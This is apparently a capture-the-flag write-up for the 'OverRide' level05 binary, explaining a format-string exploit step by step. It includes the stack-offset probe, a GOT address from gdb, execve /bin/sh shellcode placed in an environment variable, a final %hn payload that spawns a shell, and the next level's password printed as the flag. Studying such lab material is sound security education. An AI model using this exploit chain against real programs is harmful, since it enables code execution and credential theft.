# Level05

## Analysis

As usual, the source code can be found [here](./level05.c). First things we notice are that there is a call to `fgets(s, 100, stdin)` and an unprotected `printf(s)` call later on.

The buffer `s` is of size 100 so we cannot overflow using `fgets`.

However the fact that `printf()` is unprotected means that we can use it to write to any memory using `%n`.

## Exploit

We will need several elements to use this exploit. First of all, the stack index at which we need to write:

```bash
./level05
AAAA %x %x %x %x %x %x %x %x %x %x %x %x
aaaa 64 f7fcfac0 0 0 0 0 ffffffff ffffdc84 f7fdb000 61616161 20782520 25207825
```

This represent the 10th index on the stack onto which we will write the target address (the one we want to replace).

Speaking of that, we will also need to get the address of `exit@plt`, which we can do using gdb:

```bash
(gdb) disas exit
Dump of assembler code for function exit@plt:
   0x08048370 <+0>:	jmp    *0x80497e0
   0x08048376 <+6>:	push   $0x18
   0x0804837b <+11>:	jmp    0x8048330
End of assembler dump.
(gdb)
```

`0x80497e0` is the target address we will place onto the stack (at the 10th offset).

We will also be storing our shellcode inside of an env variable (since our buffer gets modified during execution by `tolowercase()`), which means that we will need to get its address too:

```bash
export SHELLCODE=$(python -c 'print "\x90" * 150 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"')
```

To get the address we will use [this program](./resources/getenv.c):

```bash
gcc -m32 getenv.c
level05@OverRide:~$ /var/crash/a.out SHELLCODE
env address at 0xffffdd4c
```

## Payload

Now that we have every part we can start getting our payload ready:

First of all we need to write to the address of `exit()`. However, we cannot simply write the value we need to the address we want using `printf(%n)` since `%n` stores its value in a pointer to `int`. Issue being that the address we need to write overflow `MAX_INT`.

Hence why we will split the desired value into two `short` using `printf` flag `%hn`.

With the new method, we need two target addresses: `exit` and `exit` + 2:

```
[exit][exit + 2][first short][second short]
```

```
[\x08\x04\x97\xe0'[::-1]] + [\x08\x04\x97\xe2'[::-1]] + [first short] + [second short]
```

Now to treat our two values we want to write:

Our shellcode address is `0xffffdd4c`, we will add an offset to it to jump into the nopslide `0xffffdd4c + 50 = 0xffffdd7e`, we will split it into two 2 bytes values: 
- first half  = `0xffff` -> second short
- second half = `0xdd7e` -> first short

`0xffff` to decimal = `65535`
`0xdd7e` to decimal = `56702`

Since the `%n` flag counts the previously written bytes (the two addresses), we will need to substract 8 bytes from the first short:

```
[\x08\x04\x97\xe0'[::-1]] + [\x08\x04\x97\xe2'[::-1]] + [56702 - 8] + [second short]
```

For the second short we need to substract everything we've already written:

```
[\x08\x04\x97\xe0'[::-1]] + [\x08\x04\x97\xe2'[::-1]] + [56694] + [65535 - 56702]
```

<details>
  <summary>Spoiler</summary>

  Now for the final formatting:

  ```
  [\x08\x04\x97\xe0'[::-1]] + [\x08\x04\x97\xe2'[::-1]] + [56694] + [8833]

  python -c "print '\x08\x04\x97\xe0'[::-1] + '\x08\x04\x97\xe2'[::-1]  + '%56694d%10\$hn'+ '%8833d%11\$hn'" > /var/crash/test.txt
  ```

  ```bash
  cat /var/crash/test.txt - | ./level05
  whoami 
  level06
  cat /home/users/level06/.pass
  h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq
  ```

</details>


